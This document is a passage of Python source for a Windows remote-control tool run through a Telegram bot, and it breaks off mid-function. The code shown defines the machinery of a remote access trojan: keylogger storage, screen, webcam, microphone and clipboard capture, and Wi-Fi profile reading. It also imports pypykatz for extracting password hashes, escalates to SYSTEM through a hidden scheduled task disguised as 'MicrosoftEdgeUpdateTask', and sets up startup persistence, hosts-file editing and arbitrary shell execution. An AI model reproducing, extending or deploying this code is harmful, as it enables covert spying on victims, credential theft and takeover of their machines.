#====================================#
# [ OWNER ]
#     CREATOR  : Vladislav Khudash
#     AGE      : 17
#     LOCATION : Ukraine
#
# [ PINFO ]
#     DATE     : 28.04.2026
#     PROJECT  : WINDOWS-TELEGRAM-BOT
#     PLATFORM : WIN32
#====================================#




import os
from   sys import (
    argv, 
    executable as pyexe,
    platform   as _sos
)


_env = os.environ


if _sos != 'win32': 
    raise SystemError(f'OS NOT SUPPORTED ({_sos})')


__file__ = os.path.realpath(argv[0])


try:
    with open(__file__, 'rb') as f:
        f.seek(0)
        IS_EXE = f.read(2) == b'MZ'
except OSError:
        IS_EXE = False


SYSTEMDISK = _env.get('SYSTEMDRIVE', 'C:\\')

if not SYSTEMDISK.endswith('\\'): 
    SYSTEMDISK = f'{SYSTEMDISK}\\'




#
#-
#--
#---
#----
#-----
#------
#-------------------------|NECESSARILY|-------------------------#
# TELEGRAM BOT TOKEN
TOKEN: str = '' 


# PASSWORD FOR SESSION WITH TELEGRAM BOT 
# GENERATE: python -c "from hashlib import sha256;print(sha256('YOUR PASSWORD HERE'.encode()).hexdigest())"
PASSWORD: str = '' 


# RESPONSIBLE FOR ENCRYPTION INITIAL VALUES 
SEED: int = 0 


# PATH TO SAVE TELEGRAM BOT
PATH: str = '' 
#-----------------------------|END|-----------------------------#



#-------------------------|OPTIONAL|-------------------------#
# HOW TO SAVE TELEGRAM BOT NAME IN PATH
BOT_FILE_NAME: str = os.path.basename(__file__)  


# TASK NAME IN SCHEDULE FOR TELEGRAM BOT & NECESSARY IF BOT_EXE IS TRUE
BOT_TASK_NAME: str = '' 


# TASK DESCRIPTION IN SCHEDULE FOR TELEGRAM BOT & NECESSARY IF BOT_EXE IS TRUE
BOT_TASK_DESCRIPTION: str = ''


# TELEGRAM BOT WILL BE LAUNCHED IN (EXE IF BOT_EXE == True ELSE PYTHON) MODE
BOT_EXE: bool = False 
#----------------------------|END|---------------------------#
#------
#-----
#----
#---
#--
#-
#




__import__('warnings').filterwarnings('ignore')
__import__('logging').disable(50)




import ctypes as capi


import shutil
import winreg
import platform

from collections import deque
from hashlib     import sha256
from threading   import Thread
from contextlib  import contextmanager
from csv         import DictReader as csv
from wave        import open as open_wave
from webbrowser  import open as open_site
from codecs      import getincrementaldecoder
from re          import compile as re_exp, DOTALL
from io          import BytesIO,        StringIO
from datetime    import datetime,       timedelta
from zipfile     import ZipFile,        ZIP_DEFLATED
from locale      import getencoding,    windows_locale
from random      import seed,           randint,          choice
from subprocess  import run as sp_run,  PIPE,             DEVNULL
from time        import sleep, time,    ctime,            mktime,     timezone
from socket      import gethostbyname as verify_domain,   AF_INET,    AF_INET6



import win32api
import win32gui
import win32net
import win32clipboard    
import win32con,         win32netcon
import win32security,    win32evtlog
import win32process,     win32serviceutil

from pythoncom       import CoInitialize, CoUninitialize
from win32com.client import Dispatch


import psutil
import mouse
import keyboard    as kb
import sounddevice as sd
import cv2         as opencv


from mss       import mss
from mss.tools import to_png
from chardet   import detect
from playsound import playsound
from winotify  import Notification
from tabulate  import tabulate      as _tabl
from requests  import get           as http_get
from pywifi    import PyWiFi, const as wifi_const


try:
    from pypykatz.registry.offline_parser import OfflineRegistry as hashpass
except ImportError:
    from pypykatz.registry.offline_parser import OffineRegistry  as hashpass


from telebot           import TeleBot
from telebot.apihelper import ApiException 




mem      = memoryview
_namep   = os.path.basename
_absp    = os.path.realpath
_splitp  = os.path.split
_exist   = os.path.exists
_isfile  = os.path.isfile
_isdir   = os.path.isdir
_remove  = os.remove
_scandir = os.scandir


windll   = capi.windll
kernel32 = windll.kernel32
advapi32 = windll.advapi32




def invalid_type(name, val, valid):
    if isinstance(val, valid):
        return
    
    raise TypeError(f'({name}) must be ({valid.__name__})')




invalid_type('PATH',          PATH,          str )
invalid_type('BOT_EXE',       BOT_EXE,       bool)
invalid_type('BOT_FILE_NAME', BOT_FILE_NAME, str )


if not BOT_FILE_NAME:
    raise ValueError('(BOT_FILE_NAME) is empty')


if PATH.endswith('\\'):
    PATH = PATH.rstrip('\\')




SESSION = {}


NULL = 'N/A'


FILE_ENCODING = 'UTF-8'
FILE_SZ_LIMIT = 49 << 20
ATTR_HIDDEN   = win32con.FILE_ATTRIBUTE_HIDDEN


_tmp = _env.get('TEMP', rf'{SYSTEMDISK}\Windows\Temp')

BOT_FILE_PATH          = f'{PATH}\\{BOT_FILE_NAME}'
BOT_FILE_PATH_RECOVERY = f'{_tmp}\\._{BOT_FILE_NAME}'


PATH_MEM   = f'{PATH}\\mem'
PATH_SYS   = f'{PATH}\\sys'
PATH_CONF  = f'{PATH_SYS}\\conf'
PATH_TMP   = f'{PATH}\\tmp'
PATH_SHARE = f'{PATH}\\share'


CONFIG_TOKEN    = f'{PATH_CONF}\\0'
CONFIG_PASSWORD = f'{PATH_CONF}\\1'
CONFIG_SEED     = f'{PATH_CONF}\\2'


GETSYSTEM_TASK_NAME   = 'MicrosoftEdgeUpdateTask'
KEYLOGGER_BUFFER_SIZE = 255


_osun = platform.uname()

PID       = os.getpid() 
MACHINE   = _osun.machine
PROCESSOR = platform.processor()
NODE      = _osun.node
USER      = _env.get('LOGNAME') or _env.get('USERNAME') or _env.get('USER') or NULL
LANG      = windows_locale.get(win32api.GetUserDefaultLangID(), NULL)
ENCODING  = getencoding()
OS        = (_osun.system, _osun.release, platform.win32_edition(), _osun.version)


FILE_BOT_RESTART    = f'{PATH_SYS}\\0'
FILE_AUTOSTART      = f'{PATH_SYS}\\1'
FILE_KEYLOGGER_FLAG = f'{PATH_SYS}\\2'

FILE_APP_BLOCKER    = f'{PATH_TMP}\\0'
FILE_KEYLOGGER      = f'{PATH_TMP}\\1'
FILE_DXDIAG         = f'{PATH_TMP}\\2'


FILE_HOSTS = rf'{SYSTEMDISK}\Windows\System32\drivers\etc\hosts'


REG_ROOT_KEY = {
    'HKEY_CLASSES_ROOT'     : winreg.HKEY_CLASSES_ROOT,
    'HKEY_LOCAL_MACHINE'    : winreg.HKEY_LOCAL_MACHINE,
    'HKEY_CURRENT_USER'     : winreg.HKEY_CURRENT_USER,
    'HKEY_CURRENT_CONFIG'   : winreg.HKEY_CURRENT_CONFIG,
    'HKEY_USERS'            : winreg.HKEY_USERS,
    'HKEY_DYN_DATA'         : winreg.HKEY_DYN_DATA,
    'HKEY_PERFORMANCE_DATA' : winreg.HKEY_PERFORMANCE_DATA
}

REG_TYPE = {
    winreg.REG_NONE                       : 'NONE',
    winreg.REG_SZ                         : 'SZ',
    winreg.REG_EXPAND_SZ                  : 'EXPAND_SZ',
    winreg.REG_BINARY                     : 'BINARY',
    winreg.REG_DWORD                      : 'DWORD',
    winreg.REG_DWORD_BIG_ENDIAN           : 'DWORD_BIG_ENDIAN',
    winreg.REG_QWORD                      : 'QWORD',
    winreg.REG_LINK                       : 'LINK',
    winreg.REG_MULTI_SZ                   : 'MULTI_SZ',
    winreg.REG_RESOURCE_LIST              : 'RESOURCE_LIST',
    winreg.REG_FULL_RESOURCE_DESCRIPTOR   : 'FULL_RESOURCE_DESCRIPTOR',
    winreg.REG_RESOURCE_REQUIREMENTS_LIST : 'RESOURCE_REQUIREMENTS_LIST'
}


REG_KEY_HARDWARE                  = rf'HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System'
REG_KEY_WINDOWS_NT                = rf'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
REG_KEY_MACHINE_CURRENTCONTROLSET = rf'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet'
REG_KEY_MACHINE_CURRENTVERSION    = rf'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion'
REG_KEY_USER_CURRENTVERSION       = rf'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion'

REG_KEY_DEVICE                    = rf'{REG_KEY_MACHINE_CURRENTCONTROLSET}\Enum'
REG_KEY_BIOS                      = rf'{REG_KEY_HARDWARE}\BIOS'
REG_KEY_CPU                       = rf'{REG_KEY_HARDWARE}\CentralProcessor'

REG_KEY_MACHINE_POLICIES          = rf'HKEY_LOCAL_MACHINE\SOFTWARE\Policies'
REG_KEY_USER_POLICIES             = rf'HKEY_CURRENT_USER\SOFTWARE\Policies'

REG_KEY_SCHEDULE                  = rf'{REG_KEY_MACHINE_CURRENTCONTROLSET}\Services\Schedule'

REG_KEY_STARTUP_MACHINE           = rf'{REG_KEY_MACHINE_CURRENTVERSION}\Run'
PATH_STARTUP_MACHINE              = rf'{SYSTEMDISK}\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'

REG_KEY_STARTUP_USER              = rf'{REG_KEY_USER_CURRENTVERSION}\Run'
PATH_STARTUP_USER                 = rf'{SYSTEMDISK}\Users\{USER}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

REG_KEY_STARTUP_MACHINE_STATUS    = rf'{REG_KEY_MACHINE_CURRENTVERSION}\Explorer\StartupApproved\Run'
PATH_STARTUP_MACHINE_STATUS       = rf'{REG_KEY_MACHINE_CURRENTVERSION}\Explorer\StartupApproved\StartupFolder'

REG_KEY_STARTUP_USER_STATUS       = rf'{REG_KEY_USER_CURRENTVERSION}\Explorer\StartupApproved\Run'
PATH_STARTUP_USER_STATUS          = rf'{REG_KEY_USER_CURRENTVERSION}\Explorer\StartupApproved\StartupFolder'

REG_KEY_APP                       = rf'{REG_KEY_MACHINE_CURRENTVERSION}\Uninstall'
REG_KEY_APP_6432                  = rf'HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'

REG_KEY_ENV_MACHINE               = rf'{REG_KEY_MACHINE_CURRENTCONTROLSET}\Control\Session Manager\Environment'
REG_KEY_ENV_USER                  = rf'HKEY_CURRENT_USER\Environment'
REG_KEY_TMP_ENV_USER              = rf'HKEY_CURRENT_USER\Volatile Environment'

REG_KEY_CONTROL_PANEL             = rf'HKEY_CURRENT_USER\Control Panel'
REG_KEY_DESKTOP                   = rf'{REG_KEY_CONTROL_PANEL}\Desktop'
REG_KEY_MOUSE                     = rf'{REG_KEY_CONTROL_PANEL}\Mouse'
REG_KEY_CURSOR                    = rf'{REG_KEY_CONTROL_PANEL}\Cursors'
REG_KEY_KEYBOARD                  = rf'{REG_KEY_CONTROL_PANEL}\Keyboard'


REG_VALUE_STARTUP_ENABLED  = mem(b'\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
REG_VALUE_STARTUP_DISABLED = mem(b'\x03\x00\x00\x00\x06\xf3\xf4\xf4VN\xdc\x01')


DEVICE_CHANGES = {
    'bios_vendor'       : ( REG_KEY_BIOS,       'BIOSVendor'                           ),
    'bios_version'      : ( REG_KEY_BIOS,       'BIOSVersion'                          ),
    'bios_date'         : ( REG_KEY_BIOS,       'BIOSReleaseDate'                      ),
    'baseboard'         : ( REG_KEY_BIOS,       'BaseBoardProduct'                     ),
    'baseboard_vendor'  : ( REG_KEY_BIOS,       'BaseBoardManufacturer'                ),
    'baseboard_version' : ( REG_KEY_BIOS,       'BaseBoardVersion'                     ),
    'cpu'               : ( REG_KEY_CPU,        'ProcessorNameString'                  ),
    'cpu_id'            : ( REG_KEY_CPU,        'Identifier'                           ),
    'cpu_mhz'           : ( REG_KEY_CPU,        '~MHz'                                 ),
    'cpu_vendor'        : ( REG_KEY_CPU,        'VendorIdentifier'                     ),
    'device_name'       : ( REG_KEY_DEVICE,     'FriendlyName'                         ),
    'device_desc'       : ( REG_KEY_DEVICE,     'DeviceDesc'                           ),
    'os'                : ( REG_KEY_WINDOWS_NT, 'ProductName'                          ),
    'os_edition'        : ( REG_KEY_WINDOWS_NT, ('EditionID', 'CompositionEditionID' ) ),
    'os_version'        : ( REG_KEY_WINDOWS_NT, ('CurrentVersion', 'DisplayVersion'  ) ),
    'os_build'          : ( REG_KEY_WINDOWS_NT, ('CurrentBuild', 'CurrentBuildNumber') ),
    'os_product'        : ( REG_KEY_WINDOWS_NT, 'ProductId'                            ),
    'os_owner'          : ( REG_KEY_WINDOWS_NT, 'RegisteredOwner'                      ),
    'os_date'           : ( REG_KEY_WINDOWS_NT, 'InstallDate'                          ),
    'node'              : ( rf'{REG_KEY_MACHINE_CURRENTCONTROLSET}\Control\ComputerName\ComputerName', 'ComputerName')
}


CIPHER = {
    wifi_const.CIPHER_TYPE_NONE    : 'NONE',
    wifi_const.CIPHER_TYPE_WEP     : 'WEP',
    wifi_const.CIPHER_TYPE_TKIP    : 'TKIP',
    wifi_const.CIPHER_TYPE_CCMP    : 'CCMP (AES)',
    wifi_const.CIPHER_TYPE_UNKNOWN : 'UNKNOWN'
}

AKM = {
    wifi_const.AKM_TYPE_NONE    : 'NONE',
    wifi_const.AKM_TYPE_WPA     : 'WPA',
    wifi_const.AKM_TYPE_WPAPSK  : 'WPA-PSK',
    wifi_const.AKM_TYPE_WPA2    : 'WPA2',
    wifi_const.AKM_TYPE_WPA2PSK : 'WPA2-PSK',
    wifi_const.AKM_TYPE_UNKNOWN : 'UNKNOWN',
    6                           : 'WPA3'
}


EVENTLOG_CATEGORY = (
    'Unknown Event Category',     
    'Network Events',             
    'Access and Authentication',  
    'Application Errors',           
    'System Information',           
    'System Failures',             
    'Updates and Installations',  
    'Security Events',              
    'System Services',             
    'Network Connections'           
)

EVENTLOG_TYPE = {
    0  : 'Unknown Event Type',      
    1  : 'Error',                       
    2  : 'Warning',                     
    4  : 'Information',            
    8  : 'Success Audit',               
    16 : 'Failure Audit'                
}


KEYBOARD_LAYOUT = {'00140C00': 'ad', '0000041C': 'al', '0000042B': 'am', '0002042B': 'am', '0003042B': 'am', '0001042B': 'am', '0000044D': 'as', '0000046D': 'ba', '00030402': 'bg', '00010402': 'bg', '00040402': 'bg', '00020402': 'bg', '00000402': 'bg', '00000445': 'bn', '00020445': 'bn', '00010445': 'bn', '0001080C': 'be', '00000813': 'be', '0000080C': 'be', '0000201A': 'bs', '000B0C00': 'bu', '0000040A': 'es', '0001040A': 'es', '00001009': 'ca', '00000C0C': 'ca', '00011009': 'ca', '00000492': 'ck', '0000045C': 'ch', '0001045C': 'ch', '00060409': 'co', '00000406': 'dk', '00000439': 'de', '00010407': 'de', '00020407': 'de', '00030407': 'de', '00000437': 'ge', '00020437': 'ge', '00030437': 'ge', '00040437': 'ge', '00010437': 'ge', '0000046F': 'gl', '00000438': 'fo', '0000040B': 'fi', '0001083B': 'fi', '0000040C': 'fr', '0001040C': 'fr', '0002040C': 'fr', '00120C00': 'ft', '000C0C00': 'gt', '00000408': 'gr', '00010408': 'gr', '00020408': 'gr', '00030408': 'gr', '00040408': 'gr', '00050408': 'gr', '00060408': 'gr', '00000474': 'gn', '00000447': 'gu', '00000468': 'ha', '0000040D': 'he', '0002040D': 'he', '0003040D': 'he', '00010439': 'hi', '0000040E': 'hu', '0001040E': 'hu', '00001809': 'ga', '00000470': 'ig', '0000085D': 'in', '0001045D': 'in', '0002045D': 'in', '0000040F': 'is', '00000410': 'it', '00010410': 'it', '00000411': 'jp', '00110C00': 'jv', '00000453': 'km', '00010453': 'km', '0000044B': 'kn', '00000412': 'kr', '0000043F': 'kz', '00000454': 'la', '0000080A': 'la', '00070C00': 'li', '00080C00': 'li', '00010427': 'lt', '00000427': 'lt', '00020427': 'lt', '0000046E': 'lu', '0000042F': 'mk', '0001042F': 'mk', '0000044C': 'ml', '0000043A': 'mt', '0001043A': 'mt', '00020850': 'mt', '00000481': 'mi', '0000044E': 'mr', '00000450': 'mn', '00000850': 'mn', '00010C00': 'mm', '00130C00': 'mm', '00000461': 'ne', '00000414': 'no', '0000043B': 'no', '00020C00': 'nt', '00090C00': 'nk', '00001409': 'nz', '00000448': 'od', '00040C00': 'og', '000D0C00': 'ol', '000F0C00': 'oi', '00150C00': 'os', '000E0C00': 'om', '00000415': 'pl', '00010415': 'pl', '00000416': 'pt', '00000816': 'pt', '00010416': 'pt', '00000463': 'ps', '00000446': 'pa', '00000418': 'ro', '00010418': 'ro', '00020418': 'ro', '00000419': 'ru', '00010419': 'ru', '00020419': 'ru', '00000485': 'sa', '0002083B': 'sa', '0001043B': 'sa', '00011809': 'sg', '00000C1A': 'sr', '0001042E': 'sr', '0002042E': 'sr', '0000081A': 'sr', '0000042E': 'sr', '00000432': 'st', '0000041A': 'st', '0000045B': 'si', '0001045B': 'si', '0000041B': 'sk', '0001041B': 'sk', '00000424': 'sl', '00100C00': 'so', '0000041D': 'sv', '0000083B': 'sv', '0000100C': 'sw', '00000807': 'sw', '0000045A': 'sy', '0001045A': 'sy', '00030C00': 'ta', '00000428': 'tj', '00000449': 'ta', '00020449': 'ta', '00030449': 'ta', '0000044A': 'te', '00010444': 'tt', '00000444': 'tt', '0000105F': 'tf', '0001105F': 'tf', '00000451': 'ti', '00010451': 'ti', '0000041E': 'th', '0002041E': 'th', '0001041E': 'th', '0003041E': 'th', '0000041F': 'tr', '0001041F': 'tr', '00000442': 'tm', '00000422': 'ua', '00020422': 'ua', '00000452': 'ua', '00000480': 'ug', '00010480': 'ug', '00000409': 'en', '00000809': 'en', '00030409': 'en', '00040409': 'en', '00020409': 'en', '00050409': 'en', '00000425': 'et', '00000843': 'uz', '0000042A': 'vi', '00000488': 'wo', '0000046A': 'yo'}


HTTP_HEADER = choice(({'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:149.0) Gecko/20100101 Firefox/149.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'}))


GETME_URL = 'https://api.telegram.org/bot{}/getMe'


IPCONFIG_URL = 'https://ipinfo.io/json'
IPCONFIG_KEY = (
             'ip',         'org',
    'country',    'region',      'city',
    'postal',     'timezone',    'loc'
)




def tabulate(r, headers, tablefmt):
    return _tabl(
        r, 
        headers          = headers, 
        tablefmt         = tablefmt,
        missingval       = NULL,
        disable_numparse = True,
        numalign         = 'left', 
        stralign         = 'left', 
        maxcolwidths     = 30
    )




def quote(
    s, 
    *, 
    _c=frozenset((
        ' ', '"', "'", 
        '(', ')', '[', ']', '{', '}', 
        '&', '|', '<', '>', '^', ';', '!', '=', 
        '%', '~', '`', '+', ','
    ))
):
    if any(n in _c for n in s):
        return f'"{s.replace("\"", "\\\"")}"'
    
    return s




def write_file(p, dt):
    if isinstance(dt, str):
        md = 'w'
        ec = FILE_ENCODING
    else:
        md = 'wb'
        ec = None


    with open(p, md, encoding=ec) as f:
        f.write(dt)
        f.flush()




def read_file(p, b=False):
    if b:
        md = 'rb'
        ec = er = None 
    else:
        md = 'r'
        ec = FILE_ENCODING
        er = 'replace'


    with open(p, md, encoding=ec, errors=er) as f:
        return mem(f.read()) if b else f.read()
        



def change_file(p, pattern, val, delete=False, enc=False):
    ok = False

    
    if not _isfile(p):
        return ok

    if not val.endswith('\n'):
        val += '\n'

    
    dt = []

    with open(p, 'r', encoding=FILE_ENCODING) as f:
        _au = dt.append
        _dc = decrypt


        for l in f:
            if enc:
                l = _dc(l)
            

            if pattern in l:
                if delete:
                    ok = True
                else:
                    _au(val)
                    ok = True
                    
            else:
                _au(l)


    if not delete and not ok:
        dt.append(val)
        ok = True


    if ok:
        with open(p, 'w', encoding=FILE_ENCODING) as f:
            _wt = f.write
            _en = encrypt


            for l in dt:
                _wt(_en(l) if enc else l)


    return ok




def encrypt(dt, *, _d=ord, _c=chr):
    k0 = KEY[0]
    k1 = KEY[1]


    f = i = 0

    with StringIO() as buf:
        _wt = buf.write


        for c in dt:
            n = _d(c)  
            x = (n << k0) ^ ( ((k1 + f) + i) & 0xFF )
            f = (f ^ x) & 0xFF
            
            _wt(_c(x))
            i += 1
        
        
        return buf.getvalue()




def decrypt(dt, *, _d=ord, _c=chr):
    k0 = KEY[0]
    k1 = KEY[1]


    f = i = 0

    with StringIO() as buf:
        _wt = buf.write
        

        for c in dt:
            n = _d(c)     
            x = n ^ ( ((k1 + f) + i) & 0xFF )  
            o = x >> k0        
            f = (f ^ n) & 0xFF 
            
            _wt(_c(o))
            i += 1
        

        return buf.getvalue()




def decode_bytes(dt, *, _ck=4096, _ch=[None]):
    if not dt:
        return ''


    if not _ch[0]:
        _ch[0] = detect(dt[0 : 128].tobytes()
                        ).get('encoding') or ENCODING
    

    dc = getincrementaldecoder(_ch[0])(errors='replace')
    
    with StringIO() as buf:
        _de = dc.decode
        _wt = buf.write


        for i in range(0, len(dt), _ck):
            _wt(_de(dt[i : i + _ck]))
            

        _wt(_de(b'', final=True))
        return buf.getvalue()
        



def mem_id(idx):
    return sha256( str(idx).encode() ).hexdigest()




if _isfile(CONFIG_SEED):
    try:

        _sd = read_file(CONFIG_SEED)

        if _sd.isdigit():
            SEED = int(_sd)

    except Exception: 
        pass



seed(SEED)
KEY = (randint(1, 8), randint(1, 256))



if _isfile(CONFIG_TOKEN):
    try:
        TOKEN = decrypt(read_file(CONFIG_TOKEN))
    except Exception: 
        pass


if _isfile(CONFIG_PASSWORD):
    try:
        PASSWORD = decrypt(read_file(CONFIG_PASSWORD))
    except Exception: 
        pass




def get_date(*, _fm='%H:%M %d.%m.%Y', _nw=datetime.now):
    try: 
        return _nw().strftime(_fm).split()
    except Exception: 
        return (NULL, NULL)
    



def parse_time(t, deft, *, _fm='%d.%m.%Y %H:%M:%S'):
    if t == 'none':
        return deft
    
    try:
        return float(t)
    except ValueError:
        return mktime( datetime.strptime(t, _fm).timetuple() )




def http(url, json=False):
    try:
        req = http_get(url, headers=HTTP_HEADER, timeout=60)
        req.raise_for_status()

        return req.json() if json else mem(req.content)
    except Exception:
        return {} if json else None
    



def mkdir(p, *, _md=os.mkdir):
    if isinstance(p, str) and not _isdir(p):
        _md(p)
    else:
        for d in p:
            if not _isdir(d):
                _md(d)




def get_layout(
    *,
    _kbl=KEYBOARD_LAYOUT.get,
    _gip=win32process.GetWindowThreadProcessId,
    _gfg=win32gui.GetForegroundWindow,
    _gkl=win32api.GetKeyboardLayout,
    _st=[0, 0, NULL] 
):
    _st[0] += 1
    
    try:
        cur = _gfg()

        if (_st[0] >= 4) or (cur != _st[1]):
            _st[0] = 0  
            _st[1] = cur 
            
            tid    = _gip(cur)[0]
            _st[2] = _kbl(
                f'{_gkl(tid) & 0xFFFF:08X}', 
                NULL
            )
            

        return _st[2]
    except Exception:
        return _st[2] 




def shell(c, output=False, timeout=600):
    try:
        ex = sp_run(
            c, 
            stdout  = PIPE if output else DEVNULL, 
            stderr  = DEVNULL, 
            timeout = timeout,
            shell   = True
        )
    except Exception:
        return None if output else False


    if output:
        if not ex.stdout:
            return None
        
        return decode_bytes(mem(ex.stdout))


    return ex.returncode == 0
            



def parse_cmd(
    exp, cmd, 
    *, 
    _re=re_exp,
    _hs=str.__hash__, 
    _rs=str.rstrip, 
    _it=dict.items,
    _ch={}
):
    h = _hs(exp)
    f = _ch.get(h)
    

    if not f:
        f = _re(exp, flags=DOTALL).match
        _ch[h] = f

    
    if r := f(cmd):
        return {k: _rs(v) if v else None 
                for (k, v) in _it(r.groupdict())}
    
    return None




def autostart():
    if not _isfile(FILE_AUTOSTART):
        return
    

    try:
        dt = decrypt(read_file(FILE_AUTOSTART))
    except Exception:
        return
    

    sep = '\u200B'

    with StringIO(dt) as buf:
        for l in buf:
            try:
                nm, arg  = l.split('=', 1)
                _, p, wd = nm.split(sep)
                arg      = arg.split(sep, 1)[0]

                launch(
                    p, 
                    '' if arg == 'none' else arg, 
                    wd == 'true'
                )
            except Exception:
                continue




@contextmanager
def scheduler(*, _sv='Schedule.Service'):
    try:
        CoInitialize()
        
        sch = Dispatch(_sv)
        sch.Connect()
        
        yield sch.GetFolder('\\')
    except Exception as er:
        raise ConnectionError(f'failed to connect scheduler ({er})')
    finally:
        CoUninitialize()




def getsystem():
    if IS_EXE:
        p   = __file__
        arg = 'none'
    else:
        p   = pyexe
        arg = __file__


    ok = create_task(
        'system',
        name=GETSYSTEM_TASK_NAME,
        description='',
        path=p,
        targs=arg,
        hidden='true',
        event=('startup',)
    )

    if not ok:
        return False


    with scheduler() as sch:
        try:
            sch.GetTask(GETSYSTEM_TASK_NAME).Run(None)
            sleep(0.1)
            sch.DeleteTask(GETSYSTEM_TASK_NAME, 0)

            return True
        except Exception:
            return False
    

    

def get_owner_path(
    p,
    *,
    _osi=win32security.OWNER_SECURITY_INFORMATION,
    _gfs=win32security.GetFileSecurity,
    _las=win32security.LookupAccountSid
):
    try:
        sid         = _gfs(p, _osi).GetSecurityDescriptorOwner()
        own, dmn, _ = _las(None, sid)

        return f'{dmn}\\\\{own}'
    except Exception:
        return NULL
    



def ls(
    p='.', 
    *, 
    _gfa=win32api.GetFileAttributes,
    _gop=get_owner_path,
    _ctm=ctime
):
    r  = []
    au = r.append
    

    try:
        sc = _scandir(p)
    except OSError:
        return ''
    
    for e in sc:
        try:

            fp = e.path
            st = e.stat()
                 
            au((
                fp, 

                'DIR'  if e.is_dir()             else 'FILE', 
                'TRUE' if _gfa(fp) & ATTR_HIDDEN else 'FALSE', 

                _gop(fp),
                f'{st.st_size} bytes', 
                _ctm(st.st_mtime) 
            ))

        except Exception:
            continue

    sc.close()



    if r:
        return tabulate(
            r, 
            headers=(
                'NAME', 
                'TYPE',     'HIDDEN', 
                'OWNER',    'SIZE',      'TIME'
            ), 
            tablefmt='grid'
        )
    
    return ''




def get_volumes():
    buf = capi.create_unicode_buffer(512)
    sz  = len(buf)


    h = kernel32.FindFirstVolumeW(buf, sz)
    
    if h == capi.c_void_p(-1).value:
        return
    

    try:
        while True:
            yield buf.value

